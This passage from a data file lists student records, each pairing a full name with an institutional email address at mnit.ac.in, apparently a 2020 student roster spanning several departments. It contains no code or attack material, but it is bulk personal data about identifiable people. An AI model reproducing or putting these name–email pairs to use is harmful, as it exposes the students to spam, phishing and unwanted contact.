    {mail: '2020UCP1169@mnit.ac.in',
    name: 'SOUMYA MEENA'},
    
    
    {mail: '2020UCP1787@mnit.ac.in',
    name: 'VANSHIKA AGGARWAL'},
    
    
    {mail: '2020UCP1865@mnit.ac.in',
    name: 'NAMAN KUMAR JHA'},
    
    
    {mail: '2020UCP1918@mnit.ac.in',
    name: 'ABHI SINGH'},
    
    
    {mail: '2020UCP1093@mnit.ac.in',
    name: 'BHARAT BARDIYA'},
    
    
    {mail: '2020UCP1774@mnit.ac.in',
    name: 'SHASHI SAURABH'},
    
    
    {mail: '2020UCP1869@mnit.ac.in',
    name: 'NISHANT GARG'},
    
    
    {mail: '2020UCP1802@mnit.ac.in',
    name: 'MAHESH KUMAR'},
    
    
    {mail: '2020UCP1804@mnit.ac.in',
    name: 'TUSHAR JAIN'},
    
    
    {mail: '2020UCP1806@mnit.ac.in',
    name: 'NIKITA ASRANI'},
    
    
    {mail: '2020UCP1163@mnit.ac.in',
    name: 'MOHIT BASANWAL'},
    
    
    {mail: '2020UCP1743@mnit.ac.in',
    name: 'AMARBIR SINGH'},
    
    
    {mail: '2020UCP1766@mnit.ac.in',
    name: 'PATEL TIRTH KUSHALBHAI'},
    
    
    {mail: '2020UCP1775@mnit.ac.in',
    name: 'SHIVAM AGARWAL'},
    
    
    {mail: '2020UCP1070@mnit.ac.in',
    name: 'DOMMARI ANITHA'},
    
    
    {mail: '2020UCP1742@mnit.ac.in',
    name: 'DEEPANSH SHARMA'},
    
    
    {mail: '2020UCP1048@mnit.ac.in',
    name: 'VANKAYALAPATI VENKATESH'},
    
    
    {mail: '2020UCP1112@mnit.ac.in',
    name: 'ERLAPPA GARI YASWANTH KISHOR'},
    
    
    {mail: '2020UCP1751@mnit.ac.in',
    name: 'VIVEK CHANDWANI'},
    
    
    {mail: '2020UCP1035@mnit.ac.in',
    name: 'PRAKASH KUMAR'},
    
    
    {mail: '2020UCP1064@mnit.ac.in',
    name: 'DEEPTI JETHE'},
    
    
    {mail: '2020UCP1105@mnit.ac.in',
    name: 'CHOURE SAHIL JAGATPAL'},
    
    
    {mail: '2020UCP1780@mnit.ac.in',
    name: 'ANISHA SINGLA'},
    
    
    {mail: '2020UCP1825@mnit.ac.in',
    name: 'SACHIN GAUTAM'},
    
    
    {mail: '2020UCP1008@mnit.ac.in',
    name: 'AJAY RAJ PATIDAR'},
    
    
    {mail: '2020UCP1046@mnit.ac.in',
    name: 'VEEPENDRA SINGH'},
    
    
    {mail: '2020UCP1050@mnit.ac.in',
    name: 'JAGNATH SARAN'},
    
    
    {mail: '2020UCP1824@mnit.ac.in',
    name: 'DHARAM PAL'},
    
    
    {mail: '2020UCP1101@mnit.ac.in',
    name: 'GAURAV KHINCHI'},
    
    
    {mail: '2020UCP1772@mnit.ac.in',
    name: 'VIPUL TAMBI'},
    
    
    {mail: '2020UCP1873@mnit.ac.in',
    name: 'DIKSHA MEHTA'},
    
    
    {mail: '2020UCP1768@mnit.ac.in',
    name: 'SHIVAM PANJIYARA'},
    
    
    {mail: '2020UCP1792@mnit.ac.in',
    name: 'DIVYANSH JAIN'},
    
    
    {mail: '2020UCP1895@mnit.ac.in',
    name: 'AGRAWAL AKSHAT NEERAJ'},
    
    
    {mail: '2020UCP1106@mnit.ac.in',
    name: 'ABHISHEK MEHRA'},
    
    
    {mail: '2020UCP1073@mnit.ac.in',
    name: 'DIVYA SINGH'},
    
    
    {mail: '2020UCP1745@mnit.ac.in',
    name: 'NIKHIL AGRAWAL'},
    
    
    {mail: '2020UCP1756@mnit.ac.in',
    name: 'BHUWAN JOSHI'},
    
    
    {mail: '2020UCP1771@mnit.ac.in',
    name: 'SHIVAM SINGLA'},
    
    
    {mail: '2020UCP1028@mnit.ac.in',
    name: 'SURENDRA KUMAR'},
    
    
    {mail: '2020UCP1043@mnit.ac.in',
    name: 'VAIBHAV YADAV'},
    
    
    {mail: '2020UCP1056@mnit.ac.in',
    name: 'VIPUL KUMAR'},
    
    
    {mail: '2020UCP1860@mnit.ac.in',
    name: 'ADITYA VYAS'},
    
    
    {mail: '2020UCP1032@mnit.ac.in',
    name: 'HARSH YADAV'},
    
    
    {mail: '2020UCP1167@mnit.ac.in',
    name: 'ANKIT KUMAR'},
    
    
    {mail: '2020UCP1739@mnit.ac.in',
    name: 'ARYAN JAIN'},
    
    
    {mail: '2020UCP1861@mnit.ac.in',
    name: 'RAJAT RAJESH RAO'},
    
    
    {mail: '2020UCP1033@mnit.ac.in',
    name: 'DAYANAND GURJAR'},
    
    
    {mail: '2020UCP1767@mnit.ac.in',
    name: 'AYUSH KUMAR SINGH'},
    
    
    {mail: '2020UCP1783@mnit.ac.in',
    name: 'SURBHI JAIN'},
    
    
    {mail: '2020UCP1875@mnit.ac.in',
    name: 'NIDHI VIKRAM MEHTA'},
    
    
    {mail: '2020UCP1982@mnit.ac.in',
    name: 'KHUSHI KUMARI'},
    
    
    {mail: '2020UCP1059@mnit.ac.in',
    name: 'AMRIT ANAND'},
    
    
    {mail: '2020UCP1078@mnit.ac.in',
    name: 'DAXABEN RATADIYA'},
    
    
    {mail: '2020UCP1770@mnit.ac.in',
    name: 'DHRUV GOYAL'},
    
    
    {mail: '2020UCP1821@mnit.ac.in',
    name: 'ABHISHEK KUMAR BASNIWAL'},
    
    
    {mail: '2020UEE1373@mnit.ac.in',
    name: 'GAUTAM KUMAR'},
    
    
    {mail: '2020UEE1381@mnit.ac.in',
    name: 'SUNIL YADAV'},
    
    
    {mail: '2020UEE1429@mnit.ac.in',
    name: 'NITIN MEEL'},
    
    
    {mail: '2020UEE1627@mnit.ac.in',
    name: 'SHOBHIT KUMAR MEENA'},
    
    
    {mail: '2020UEE1630@mnit.ac.in',
    name: 'POOJA MEENA'},
    
    
    {mail: '2020UEE1992@mnit.ac.in',
    name: 'ASHOK KUMAR SAINI'},
    
    
    {mail: '2020UEE1299@mnit.ac.in',
    name: 'RITIKA KHANDELWAL'},
    
    
    {mail: '2020UEE1508@mnit.ac.in',
    name: 'SHOBHIT DOHARE'},
    
    
    {mail: '2020UEE1557@mnit.ac.in',
    name: 'AVNEESH SINGHANIA'},
    
    
    {mail: '2020UEE1172@mnit.ac.in',
    name: 'AJEET KUMAR'},
    
    
    {mail: '2020UEE1543@mnit.ac.in',
    name: 'PANKAJ BHUPESH'},
    
    
    {mail: '2020UEE2010@mnit.ac.in',
    name: 'AASHISH YADAV'},
    
    
    {mail: '2020UEE1217@mnit.ac.in',
    name: 'YADURAJ SINGH DEORA'},
    
    
    {mail: '2020UEE1377@mnit.ac.in',
    name: 'SANKET SINGH'},
    
    
    {mail: '2020UEE1604@mnit.ac.in',
    name: 'YASHWANT PATEL'},
    
    
    {mail: '2020UEE1320@mnit.ac.in',
    name: 'HARSH SHARMA'},
    
    
    {mail: '2020UEE1445@mnit.ac.in',
    name: 'HIMANSHU VISHWAKARMA'},
    
    
    {mail: '2020UEE1476@mnit.ac.in',
    name: 'ABHINAV KUMAR'},
    
    
    {mail: '2020UEE1900@mnit.ac.in',
    name: 'PALAGUDI SAI PRATHYUSHA'},
    
    
    {mail: '2020UEE1062@mnit.ac.in',
    name: 'HIMANSHU SHARMA'},
    
    
    {mail: '2020UEE1241@mnit.ac.in',
    name: 'SANIDHYA GUPTA'},
    
    
    {mail: '2020UEE1409@mnit.ac.in',
    name: 'TUSHAR BHADHANIA'},
    
    
    {mail: '2020UEE1896@mnit.ac.in',
    name: 'SATYAM SINGH SOAM'},
    
    
    {mail: '2020UEE1310@mnit.ac.in',
    name: 'SHRISTI BHOMRAJKA'},
    
    
    {mail: '2020UEE1189@mnit.ac.in',
    name: 'DEEPAK BHARDWAJ'},
    
    
    {mail: '2020UEE1314@mnit.ac.in',
    name: 'SAKSHI BHAGDIKAR'},
    
    
    {mail: '2020UEE1899@mnit.ac.in',
    name: 'MAHENDRA SINGH'},
    
    
    {mail: '2020UEE1207@mnit.ac.in',
    name: 'PRIYANSHU KASLIWAL'},
    
    
    {mail: '2020UEE1305@mnit.ac.in',
    name: 'SONALI SINGH'},
    
    
    {mail: '2020UEE1455@mnit.ac.in',
    name: 'ADITYA GUPTA'},
    
    
    {mail: '2020UEE1597@mnit.ac.in',
    name: 'SURAPELLI SAI SHREYA'},
    
    
    {mail: '2020UEE1235@mnit.ac.in',
    name: 'PRIYANSH PANDEY'},
    
    
    {mail: '2020UEE1248@mnit.ac.in',
    name: 'ABHISHEK GOUR'},
    
    
    {mail: '2020UEE1302@mnit.ac.in',
    name: 'MITALI MATHUR'},
    
    
    {mail: '2020UEE1357@mnit.ac.in',
    name: 'ANUJ JAIN'},
    
    
    {mail: '2020UEE1898@mnit.ac.in',
    name: 'SHIWANI JAGRAVAL'},
    
    
    {mail: '2020UEE1606@mnit.ac.in',
    name: 'SUMIT MEENA'},
    
    
    {mail: '2020UEE1872@mnit.ac.in',
    name: 'AYAAN AHMAD'},
    
    
    {mail: '2020UEE1424@mnit.ac.in',
    name: 'MANOJ GAHLOT'},
    
    
    {mail: '2020UEE1885@mnit.ac.in',
    name: 'TANMAY JINDAL'},
    
    
    {mail: '2020UEE2007@mnit.ac.in',
    name: 'RITESH GIRI'},
    
    
    {mail: '2020UEE1301@mnit.ac.in',
    name: 'MUSKAN JAIN'},
    
    
    {mail: '2020UEE1897@mnit.ac.in',
    name: 'KHUSHI JAIN'},
    
    
    {mail: '2020UEE1987@mnit.ac.in',
    name: 'PRIYANSHU NAGAR'},
    
    
    {mail: '2020UEE1988@mnit.ac.in',
    name: 'PRATYUSH SHUKLA'},
    
    
    {mail: '2020UEE1345@mnit.ac.in',
    name: 'KULJYOTI'},
    
    
    {mail: '2020UEE1188@mnit.ac.in',
    name: 'DIVYANSH SHARMA'},
    
    
    {mail: '2020UEE1419@mnit.ac.in',
    name: 'PRIYANSHU'},
    
    
    {mail: '2020UEE1428@mnit.ac.in',
    name: 'MANOJ KUMAR'},
    
    
    {mail: '2020UEE1219@mnit.ac.in',
    name: 'PRIYANSHU GUPTA'},
    
    
    {mail: '2020UEE1304@mnit.ac.in',
    name: 'SWATI DAVE'},
    
    
    {mail: '2020UEE1350@mnit.ac.in',
    name: 'SHIKHA MISHRA'},
    
    
    {mail: '2020UEE1523@mnit.ac.in',
    name: 'KANA RAM VERMA'},
    
    
    {mail: '2020UEE1535@mnit.ac.in',
    name: 'RUCHIKA BHAGAT'},
    
    
    {mail: '2020UEE2001@mnit.ac.in',
    name: 'SUMIT KUMAR'},
    
    
    {mail: '2020UEE1330@mnit.ac.in',
    name: 'ANISH SHANKAR'},
    
    
    {mail: '2020UEE1443@mnit.ac.in',
    name: 'KAUSHIK NANDAN'},
    
    
    {mail: '2020UEE1554@mnit.ac.in',
    name: 'ABHISHEK KUMAR ANURAG'},
    
    
    {mail: '2020UEE1234@mnit.ac.in',
    name: 'ABHISHEK GUPTA'},
    
    
    {mail: '2020UEE1483@mnit.ac.in',
    name: 'KOMAL KSHIRSAGAR'},
    
    
    {mail: '2020UEE1486@mnit.ac.in',
    name: 'TEENA'},
    
    
    {mail: '2020UEE1517@mnit.ac.in',
    name: 'LAVESH CHANDEL'},
    
    
    {mail: '2020UEE1541@mnit.ac.in',
    name: 'DEEPAK'},
    
    
    {mail: '2020UEE1583@mnit.ac.in',
    name: 'RAJVEER BAIRWA'},
    
    
    {mail: '2020UEE1520@mnit.ac.in',
    name: 'AYUSH JONWAL'},
    
    
    {mail: '2020UEE1985@mnit.ac.in',
    name: 'YASH MITTAL'},
    
    
    {mail: '2020UEE1411@mnit.ac.in',
    name: 'JAGDISH THOLIYA'},
    
    
    {mail: '2020UEE1318@mnit.ac.in',
    name: 'KARTIKEYA DUBEY'},
    
    
    {mail: '2020UEE1499@mnit.ac.in',
    name: 'TIRMARE TANAYA SATISH'},
    
    
    {mail: '2020UEE1993@mnit.ac.in',
    name: 'PRATUSH DIXIT'},
    
    
    {mail: '2020UEE1204@mnit.ac.in',
    name: 'AADISH JAIN'},
    
    
    {mail: '2020UEE1262@mnit.ac.in',
    name: 'VINAYAK VIKRAM SINGH'},
    
    
    {mail: '2020UEE1312@mnit.ac.in',
    name: 'MAHAK GARG'},
    
    
    {mail: '2020UEE1337@mnit.ac.in',
    name: 'KSHITIJ PRATAP SINGH'},
    
    
    {mail: '2020UEE1513@mnit.ac.in',
    name: 'ADITYA BANSAL'},
    
    
    {mail: '2020UEE1183@mnit.ac.in',
    name: 'JAI KUMAR BEGANI'},
    
    
    {mail: '2020UEE1238@mnit.ac.in',
    name: 'TUSHAR MITTAL'},
    
    
    {mail: '2020UEE1362@mnit.ac.in',
    name: 'VAIBHAV GUPTA'},
    
    
    {mail: '2020UEE1442@mnit.ac.in',
    name: 'DEVANG SHRIMALI'},
    
    
    {mail: '2020UEE1490@mnit.ac.in',
    name: 'BUSHRA SABBAG'},
    
    
    {mail: '2020UEE1618@mnit.ac.in',
    name: 'SHIVANI MEENA'},
    
    
    {mail: '2020UEE1458@mnit.ac.in',
    name: 'ADITYA YADAV'},
    
    
    {mail: '2020UEE1580@mnit.ac.in',
    name: 'ASHISH KUMAR'},
    
    
    {mail: '2020UEE1593@mnit.ac.in',
    name: 'VANSHIKA SINGH'},
    
    
    {mail: '2020UEE1503@mnit.ac.in',
    name: 'POOJA JAISWAL'},
    
    
    {mail: '2020UEE1633@mnit.ac.in',
    name: 'VANKUDOTH SOMESH KUMAR NAIK'},
    
    
    {mail: '2020UEE1297@mnit.ac.in',
    name: 'HIMANGI SINGH ASAWAT'},
    
    
    {mail: '2020UEE1397@mnit.ac.in',
    name: 'ABHISHEK JINJWADIYA'},
    
    
    {mail: '2020UEE1427@mnit.ac.in',
    name: 'LAXMAN PRASAD'},
    
    
    {mail: '2020UEE1525@mnit.ac.in',
    name: 'JAGDEESH'},
    
    
    {mail: '2020UEE1185@mnit.ac.in',
    name: 'PRERIT JAIN'},
    
    
    {mail: '2020UEE1493@mnit.ac.in',
    name: 'NEHA KUMARI'},
    
    
    {mail: '2020UEE1539@mnit.ac.in',
    name: 'SURYA PRATAP SINGH'},
    
    
    {mail: '2020UEE1969@mnit.ac.in',
    name: 'SHIVAM KUMAR JHA'},
    
    
    {mail: '2020UEE1231@mnit.ac.in',
    name: 'ANAMAYA'},
    
    
    {mail: '2020UEE1245@mnit.ac.in',
    name: 'ABHAY PRATAP SINGH'},
    
    
    {mail: '2020UEE1277@mnit.ac.in',
    name: 'VIPUL SRIVASTAVA'},
    
    
    {mail: '2020UEE1472@mnit.ac.in',
    name: 'MANGESH NATH VERMA'},
    
    
    {mail: '2020UEE1980@mnit.ac.in',
    name: 'SUMANT KUMAR'},
    
    
    {mail: '2020UEE1995@mnit.ac.in',
    name: 'SHAKTI PATHAK'},
    
    
    {mail: '2020UEE1325@mnit.ac.in',
    name: 'SUMIT CHOUDHARY'},
    
    
    {mail: '2020UEE1329@mnit.ac.in',
    name: 'HIMANSHU SHARMA'},
    
    
    {mail: '2020UEE1354@mnit.ac.in',
    name: 'UDAY SHARMA'},
    
    
    {mail: '2020UEE1431@mnit.ac.in',
    name: 'HARSH KUMAR'},
    
    
    {mail: '2020UEE1478@mnit.ac.in',
    name: 'ANNANEYA'},
    
    
    {mail: '2020UEE1616@mnit.ac.in',
    name: 'KARAN MEENA'},
    
    
    {mail: '2020UEE1642@mnit.ac.in',
    name: 'VIVEK NAIK ESLAVATH'},
    
    
    {mail: '2020UEE1415@mnit.ac.in',
    name: 'KUSHAL JANGIR'},
    
    
    {mail: '2020UEE1550@mnit.ac.in',
    name: 'BHARAT'},
    
    
    {mail: '2020UEE1990@mnit.ac.in',
    name: 'SANSKAR BANSAL'},
    
    
    {mail: '2020UEE1211@mnit.ac.in',
    name: 'GAURAV JOSHI'},
    
    
    {mail: '2020UEE1256@mnit.ac.in',
    name: 'SAHIL GARG'},
    
    
    {mail: '2020UEE1259@mnit.ac.in',
    name: 'DIVANSHU SHARMA'},
    
    
    {mail: '2020UEE1273@mnit.ac.in',
    name: 'ANKIT KUMAR SWARNKAR'},
    
    
    {mail: '2020UEE1294@mnit.ac.in',
    name: 'TANYA VIJAY'},
    
    
    {mail: '2020UEE1359@mnit.ac.in',
    name: 'JASWANT SINGH'},
    
    
    {mail: '2020UEE1214@mnit.ac.in',
    name: 'MOHIT BANSAL'},
    
    
    {mail: '2020UEE1323@mnit.ac.in',
    name: 'ANURAG SINGHAL'},
    
    
    {mail: '2020UEE1342@mnit.ac.in',
    name: 'VIKASH KUMAR'},
    
    
    {mail: '2020UEE1998@mnit.ac.in',
    name: 'KHUSHI MEENA'},
    
    
    {mail: '2020UEE1367@mnit.ac.in',
    name: 'HIMANSHU SAXENA'},
    
    
    {mail: '2020UEE1466@mnit.ac.in',
    name: 'SURAJ KUMAR'},
    
    
    {mail: '2020UEE1529@mnit.ac.in',
    name: 'GADDAM MAHESH'},
    
    
    {mail: '2020UEC1253@mnit.ac.in',
    name: 'KESHAV KUMAR GUPTA'},
    
    
    {mail: '2020UEC1316@mnit.ac.in',
    name: 'AASHISH RAJ'},
    
    
    {mail: '2020UEC1341@mnit.ac.in',
    name: 'HIMANSHU OMAR'},
    
    
    {mail: '2020UEC1551@mnit.ac.in',
    name: 'SHUBHAM YADAV'},
    
    
    {mail: '2020UEC1512@mnit.ac.in',
    name: 'AMEER KHAN'},
    
    
    {mail: '2020UEC1562@mnit.ac.in',
    name: 'ISHA KUMARI'},
    
    
    {mail: '2020UEC2013@mnit.ac.in',
    name: 'DEV KUMAR VORA'},
    
    
    {mail: '2020UEC1647@mnit.ac.in',
    name: 'SAKSHI SANJAY MAHAJAN'},
    
    
    {mail: '2020UEC1653@mnit.ac.in',
    name: 'AAYUSH CHHABRA'},
    
    
    {mail: '2020UEC1773@mnit.ac.in',
    name: 'AKSHANSH KUMAR GAUTAM'},
    
    
    {mail: '2020UEC1852@mnit.ac.in',
    name: 'BHAVIKA JANGID'},
    
    
    {mail: '2020UEC1870@mnit.ac.in',
    name: 'AARYAN PREM'},
    
    
    {mail: '2020UEC1505@mnit.ac.in',
    name: 'VISHAL JAISWAL'},
    
    
    {mail: '2020UEC1614@mnit.ac.in',
    name: 'ATHARVA RAJESH DHURI'},
    
    
    {mail: '2020UEC1733@mnit.ac.in',
    name: 'NEELESH GOYAL'},
    
    
    {mail: '2020UEC2009@mnit.ac.in',
    name: 'NEELIROTHU DILEEP RAM KUMAR'},
    
    
    {mail: '2020UEC1920@mnit.ac.in',
    name: 'AVINASH PAIKRA'},
    
    
    {mail: '2020UEC1300@mnit.ac.in',
    name: 'HARSHITA GOYAL'},
    
    
    {mail: '2020UEC1327@mnit.ac.in',
    name: 'MANISH CHANDRA JHA'},
    
    
    {mail: '2020UEC1346@mnit.ac.in',
    name: 'SAGAR GUPTA'},
    
    
    {mail: '2020UEC1489@mnit.ac.in',
    name: 'AMAN AGARWAL'},
    
    
    {mail: '2020UEC1747@mnit.ac.in',
    name: 'RITU RAJ'},
    
    
    {mail: '2020UEC1372@mnit.ac.in',
    name: 'GUNGUN SINGHAL'},
    
    
    {mail: '2020UEC1789@mnit.ac.in',
    name: 'ADITYA RAJ'},
    
    
    {mail: '2020UEC2025@mnit.ac.in',
    name: 'SANDEEP GAUTAM'},
    
    
    {mail: '2020UEC1198@mnit.ac.in',
    name: 'VATSALYA SAGRAYA'},
    
    
    {mail: '2020UEC1356@mnit.ac.in',
    name: 'NITIN SINGH'},
    
    
    {mail: '2020UEC1607@mnit.ac.in',
    name: 'PAWAN KUMAR JANGIR'},
    
    
    {mail: '2020UEC1886@mnit.ac.in',
    name: 'SHIVANG PAREEK'},
    
    
    {mail: '2020UEC1080@mnit.ac.in',
    name: 'SHAH MOXESH MITUL'},
    
    
    {mail: '2020UEC1755@mnit.ac.in',
    name: 'HARSH RAJWANSHI'},
    
    
    {mail: '2020UEC1295@mnit.ac.in',
    name: 'SAKSHI ARORA'},
    
    
    {mail: '2020UEC1710@mnit.ac.in',
    name: 'HITAKSHI BAHARWANI'},
    
    
    {mail: '2020UEC1465@mnit.ac.in',
    name: 'DEEPAK MATHUR'},
    
    
    {mail: '2020UEC1706@mnit.ac.in',
    name: 'KHUSHBU SWAMI'},
    
    
    {mail: '2020UEC1793@mnit.ac.in',
    name: 'ANKIT MEENA'},
    
    
    {mail: '2020UEC1055@mnit.ac.in',
    name: 'PRAKHAR GUPTA'},
    
    
    {mail: '2020UEC1496@mnit.ac.in',
    name: 'KUNAL MISHRA'},
    
    
    {mail: '2020UEC1814@mnit.ac.in',
    name: 'BANOTH LIKITHA'},
    
    
    {mail: '2020UEC1874@mnit.ac.in',
    name: 'GAURAV AMAR KOLTE'},
    
    
    {mail: '2020UEC1729@mnit.ac.in',
    name: 'LAKSHYA JEENGAR'},
    
    
    {mail: '2020UEC1769@mnit.ac.in',
    name: 'SHIVAM DHARIYA'},
    
    
    {mail: '2020UEC1306@mnit.ac.in',
    name: 'SRISHTI PORWAL'},
    
    
    {mail: '2020UEC1888@mnit.ac.in',
    name: 'AKASH KUMAR SAHU'},
    
    
    {mail: '2020UEC1686@mnit.ac.in',
    name: 'NATHI ARYANRUTHWIK'},
    
    
    {mail: '2020UEC1585@mnit.ac.in',
    name: 'SAJID'},
    
    
    {mail: '2020UEC1641@mnit.ac.in',
    name: 'ABHISHEK JAKHAR'},
    
    
    {mail: '2020UEC1725@mnit.ac.in',
    name: 'SAHIL BAIRWA'},
    
    
    {mail: '2020UEC1473@mnit.ac.in',
    name: 'NIKHIL AGARWAL'},
    
    
    {mail: '2020UEC1645@mnit.ac.in',
    name: 'KULDEEP DADRWAL'},
    
    
    {mail: '2020UEC1697@mnit.ac.in',
    name: 'VAAGDEVI VENKATA SIRISHA MALLA'},
    
    
    {mail: '2020UEC1714@mnit.ac.in',
    name: 'SHWETA'},
    
    
    {mail: '2020UEC1777@mnit.ac.in',
    name: 'NISHA MEHRA'},
    
    
    {mail: '2020UEC1331@mnit.ac.in',
    name: 'MOHIT PODDAR'},
    
    
    {mail: '2020UEC1016@mnit.ac.in',
    name: 'UJJAVAL GUPTA'},
    
    
    {mail: '2020UEC1758@mnit.ac.in',
    name: 'GAUTAM KHATIK'},
    
    
    {mail: '2020UEC1762@mnit.ac.in',
    name: 'YADLAPALLI DILEEP KUMAR'},
    
    
    {mail: '2020UEC1084@mnit.ac.in',
    name: 'ANKIT AGGARWAL'},
    
    
    {mail: '2020UEC1600@mnit.ac.in',
    name: 'DURGESH SAINI'},
    
    
    {mail: '2020UEC1693@mnit.ac.in',
    name: 'PRANSHU SARAF'},
    
    
    {mail: '2020UEC1720@mnit.ac.in',
    name: 'GIRISH'},
    
    
    {mail: '2020UEC1868@mnit.ac.in',
    name: 'MURALIKRISHNA MANOJ KUMAR'},
    
    
    {mail: '2020UEC1570@mnit.ac.in',
    name: 'ARYAN BHADHRECHA'},
    
    
    {mail: '2020UEC2006@mnit.ac.in',
    name: 'GUNTUKU ABHILASH'},
    
    
    {mail: '2020UEC2008@mnit.ac.in',
    name: 'ARJI DILEEP KUMAR'},
    
    
    {mail: '2020UEC1066@mnit.ac.in',
    name: 'ABHISHEK MITTAL'},
    
    
    {mail: '2020UEC1480@mnit.ac.in',
    name: 'HARDIK'},
    
    
    {mail: '2020UEC1637@mnit.ac.in',
    name: 'SANJEEV KUMAR'},
    
    
    {mail: '2020UEC1682@mnit.ac.in',
    name: 'NITTURU VISHNU SWAROOP'},
    
    
    {mail: '2020UEC1800@mnit.ac.in',
    name: 'ANIKESH MEENA'},
    
    
    {mail: '2020UEC1876@mnit.ac.in',
    name: 'BHOMIK KUMAR DABI'},
    
    
    {mail: '2020UEC1901@mnit.ac.in',
    name: 'KHANRA AKASH ANANTA'},
    
    
    {mail: '2020UEC1239@mnit.ac.in',
    name: 'YUVRAJ SINGH'},
    
    
    {mail: '2020UEC1270@mnit.ac.in',
    name: 'GEETANJALI JAIN'},
    
    
    {mail: '2020UEC1656@mnit.ac.in',
    name: 'KARTIK RATHOR'},
    
    
    {mail: '2020UEC1666@mnit.ac.in',
    name: 'KANWAR ADITYA SINGH'},
    
    
    {mail: '2020UEC1797@mnit.ac.in',
    name: 'SANJAY KUMAR MEENA'},
    
    
    {mail: '2020UEC2005@mnit.ac.in',
    name: 'PAINDLA SATHWIK'},
    
    
    {mail: '2020UEC2019@mnit.ac.in',
    name: 'KAMAL MITTAL'},
    
    
    {mail: '2020UEC1095@mnit.ac.in',
    name: 'GOVIND KUMAR AGRAWAL'},
    
    
    {mail: '2020UEC1854@mnit.ac.in',
    name: 'CHIKKALA KIRAN BABU'},
    
    
    {mail: '2020UEC1319@mnit.ac.in',
    name: 'KOLLA YAGNA SIVA SAI KUMAR'},
    
    
    {mail: '2020UEC1528@mnit.ac.in',
    name: 'KRISHNA KARODIWAL'},
    
    
    {mail: '2020UEC1752@mnit.ac.in',
    name: 'DINESH PHULWARIYA'},
    
    
    {mail: '2020UEC1784@mnit.ac.in',
    name: 'AASHIMA JAJORIA'},
    
    
    {mail: '2020UEC1007@mnit.ac.in',
    name: 'KARANJIT SINGH'},
    
    
    {mail: '2020UEC1123@mnit.ac.in',
    name: 'NIMISH TOSHNIWAL'},
    
    
    {mail: '2020UEC1215@mnit.ac.in',
    name: 'PRIANSHU MITTAL'},
    
    
    {mail: '2020UEC1368@mnit.ac.in',
    name: 'BHARAT PAMNANI'},
    
    
    {mail: '2020UEC1670@mnit.ac.in',
    name: 'SANCHIT DADHICH'},
    
    
    {mail: '2020UEC1811@mnit.ac.in',
    name: 'GARIMA SULANIYA'},
    
    
    {mail: '2020UEC1004@mnit.ac.in',
    name: 'SHASHANK SULLEREY'},
    
    
    {mail: '2020UEC1659@mnit.ac.in',
    name: 'DISHANT RATHI'},
    
    
    {mail: '2020UEC1765@mnit.ac.in',
    name: 'SIDDHARTH GUNSARIA'},
    
    
    {mail: '2020UEC2016@mnit.ac.in',
    name: 'ASHUTOSH MISHRA'},
    
    
    {mail: '2020UEC1045@mnit.ac.in',
    name: 'SAKET BANSAL'},
    
    
    {mail: '2020UEC1287@mnit.ac.in',
    name: 'VANSHIKA THAKUR'},
    
    
    {mail: '2020UEC1576@mnit.ac.in',
    name: 'AMIT BORAVAT'},
    
    
    {mail: '2020UEC1701@mnit.ac.in',
    name: 'TEENA KUMARI'},
    
    
    {mail: '2020UEC1592@mnit.ac.in',
    name: 'HITESH KALASH'},
    
    
    {mail: '2020UEC1722@mnit.ac.in',
    name: 'MAYANK KASOTIYA'},
    
    
    {mail: '2020UEC1757@mnit.ac.in',
    name: 'PILLI SAI KIRAN'},
    
    
    {mail: '2020UEC1887@mnit.ac.in',
    name: 'PANDYA NEEL VIJAYKUMAR'},
    
    
    {mail: '2020UEC1649@mnit.ac.in',
    name: 'GAURAV AGARWAL'},
    
    
    {mail: '2020UEC1741@mnit.ac.in',
    name: 'NEAL GAUTAM'},
    
    
    {mail: '2020UEC2024@mnit.ac.in',
    name: 'SHIVANI LOHIYA'},
    
    
    {mail: '2020UEC1629@mnit.ac.in',
    name: 'AMAN KUMAR ROY'},
    
    
    {mail: '2020UEC2022@mnit.ac.in',
    name: 'HITESHI'},
    
    
    {mail: '2020UEC1383@mnit.ac.in',
    name: 'BADDAM NITHYA REDDY'},
    
    
    {mail: '2020UEC1537@mnit.ac.in',
    name: 'YOGESH PRASAD'},
    
    
    {mail: '2020UEC2003@mnit.ac.in',
    name: 'SHUBHAM GUPTA'},
    
    
    {mail: '2020UEC1135@mnit.ac.in',
    name: 'PRAKHAR AGRAWAL'},
    
    
    {mail: '2020UEC1266@mnit.ac.in',
    name: 'OJASWI AGARWAL'},
    
    
    {mail: '2020UEC1117@mnit.ac.in',
    name: 'DEVASHISH JUYAL'},
    
    
    {mail: '2020UEC1651@mnit.ac.in',
    name: 'PRANAV DHARMADHIKARI'},
    
    
    {mail: '2020UEC1690@mnit.ac.in',
    name: 'SURBHI TAMRAKAR'},
    
    
    {mail: '2020UEC1807@mnit.ac.in',
    name: 'SIMRANJEET SINGH'},
    
    
    {mail: '2020UEC1853@mnit.ac.in',
    name: 'SHIVANG JAIN'},
    
    
    {mail: '2020UEC1902@mnit.ac.in',
    name: 'ROHIT'},
    
    
    {mail: '2020UEC1672@mnit.ac.in',
    name: 'N ROHITH'},
    
    
    {mail: '2020UEC2023@mnit.ac.in',
    name: 'HIMADRI'},
    
    
    {mail: '2020UEC1621@mnit.ac.in',
    name: 'VATSAL SONI'},
    
    
    {mail: '2020UEC1654@mnit.ac.in',
    name: 'DONABODI SUNEEL KUMAR'},
    
    
    {mail: '2020UME1022@mnit.ac.in',
    name: 'HAR CHARAN SINGH'},
    
    
    {mail: '2020UME1020@mnit.ac.in',
    name: 'MOHD DANISH'},
    
    
    {mail: '2020UME1074@mnit.ac.in',
    name: 'MEERA YADAV'},
    
    
    {mail: '2020UME1136@mnit.ac.in',
    name: 'BASANI ROHAN KALYAN'},
    
    
    {mail: '2020UME1855@mnit.ac.in',
    name: 'PRAJJWAL SRIVASTAVA'},
    
    
    {mail: '2020UME1856@mnit.ac.in',
    name: 'AMIT KUMAR UPADHYAY'},
    
    
    {mail: '2020UME2011@mnit.ac.in',
    name: 'NIKHIL RANJAN'},
    
    
    {mail: '2020UME1845@mnit.ac.in',
    name: 'RAHUL KUMAR DUBEY'},
    
    
    {mail: '2020UME2017@mnit.ac.in',
    name: 'SUHANI JENA'},
    
    
    {mail: '2020UME1051@mnit.ac.in',
    name: 'AGRAWAL JAY BHOLESHWARBHAI'},
    
    
    {mail: '2020UME1660@mnit.ac.in',
    name: 'VIJAY RAJ'},
    
    
    {mail: '2020UME1829@mnit.ac.in',
    name: 'KEVOLISH CHAWLA'},
    
    
    {mail: '2020UME1907@mnit.ac.in',
    name: 'ANKIT KUMAR'},
    
    
    {mail: '2020UME1232@mnit.ac.in',
